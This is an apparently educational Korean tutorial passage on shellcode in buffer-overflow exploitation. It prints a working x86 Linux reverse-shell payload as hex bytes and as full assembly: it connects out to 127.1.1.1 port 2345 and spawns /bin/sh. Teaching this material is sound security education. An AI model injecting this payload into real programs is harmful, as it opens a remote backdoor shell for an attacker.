# 쉘코드(shellcode) 소개

실습에서는 **이미 존재하는 코드**( hidden 함수라던가) 의 주소로 return address 를 덮어서 점프를 했습니다만

어떨 때는, **해커가 만든 기계어를 버퍼에 저장한다음, 그 기계어로 점프를 할 수 있는 경우**가 있습니다.

컴퓨터는 점프한 곳이 **유효한 주소**(실제로 메모리상에 있는 주소)이면, 그 곳에 있는 코드들을 **그냥 실행**합니다.

즉, 입력이나 파일, 데이터 입력등의 Attack Vector 로 해커가 만든 기계어**(보통 어셈블리어로 작성)**를 

### 예시 : reverse shellcode

예를 들어, 이렇게 생긴 쉘코드를 삽입해서 실행시킬 수 있게 되면,

```
\x6a\x66\x58\x99\x6a\x1\x5b\x52\x53\x6a\x2\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x1\x1\x1\x66\x68\x9\x29\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x87\xd3\x6a\x2\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\xb\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
```

아래와 같은 명령이 컴퓨터에서 강제로 실행되어서,  외부와 연결된 **백도어를 해킹된 프로그램 안에 강제로 생성합니다.**

```
BITS 32

push BYTE 102
pop eax
cdq
push dword 1
pop ebx
push edx
push ebx
push BYTE 2
mov ecx, esp
int 0x80

xchg edx,eax

mov al, 0x66
push DWORD 0x0101017f
push WORD 0x2909
inc ebx
push WORD bx
mov ecx, esp
push BYTE 16
push ecx
push edx
mov ecx, esp
inc ebx
int 0x80

xchg edx,ebx
push BYTE 0x2
pop ecx
dup2_call:
    mov BYTE al, 0x3F
    int 0x80
    dec ecx
    jns dup2_call

mov BYTE al, 11
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
mov edx, esp
push ebx
mov ecx, esp
int 0x80

```